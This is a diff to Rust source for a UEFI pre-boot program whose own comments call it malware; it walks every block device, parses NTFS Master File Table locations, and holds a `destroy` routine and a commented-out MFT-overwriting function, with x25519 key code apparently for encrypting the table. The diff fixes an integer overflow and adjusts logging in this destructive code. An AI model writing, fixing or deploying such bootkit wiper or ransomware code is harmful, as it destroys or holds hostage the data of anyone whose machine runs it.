@@ -9,8 +9,8 @@ use uefi::proto::media::block::BlockIO;
 use uefi::table::Boot;
 use x25519_dalek::{EphemeralSecret, PublicKey};
 
-use crate::file::write_file;
 use crate::file::read_file;
+use crate::file::write_file;
 
 const OEM_ID: &[u8; 8] = b"NTFS    ";
 
@@ -104,7 +104,7 @@ fn get_mft_ranges(
     loop {
         match mft_entry_buf[data_run_offset] {
             0x31 => {
-                let data_run_size = (mft_entry_buf[data_run_offset + 1] * 8) as u64;
+                let data_run_size = (mft_entry_buf[data_run_offset + 1] as u64) * 8;
                 let mut data_run_first =
                     mft_entry_buf[data_run_offset + 2..data_run_offset + 5].to_vec();
                 data_run_first.push(0);
@@ -166,10 +166,12 @@ fn get_mft_ranges(
         }
     }
 
+    log::info!("{:#?}", ranges);
+
     Ok(ranges)
 }
 
-/// Fire !
+/*/// Fire !
 fn beat_the_shit_out_of_the_mft(
     blk: &mut BlockIO,
     media_id: u32,
@@ -192,18 +194,13 @@ fn beat_the_shit_out_of_the_mft(
     log::info!("Finished !"); // DEBUG
 
     Ok(())
-}
+}*/
 
 pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
     // Get list of handles which instantiate a BlockIO
-    let handles = st
-        .boot_services()
-        .find_handles::<BlockIO>()?; // TODO: You might not want your malware to panic bro
-
+    let handles = st.boot_services().find_handles::<BlockIO>()?;
     for handle in handles {
-        let blk = st
-            .boot_services()
-            .handle_protocol::<BlockIO>(handle)?;
+        let blk = st.boot_services().handle_protocol::<BlockIO>(handle)?;
 
         let blk = unsafe { &mut *blk.get() };
         let blk_media = blk.media();
@@ -221,7 +218,8 @@ pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
 
         if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
 
-            log::info!("{:#?}", ranges);
+            //log::info!("{:#?}", ranges);
+
             /*let public_key_hex = include_str!("include/public_key.hex");
             let mut buf = [0u8; 32];
             hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
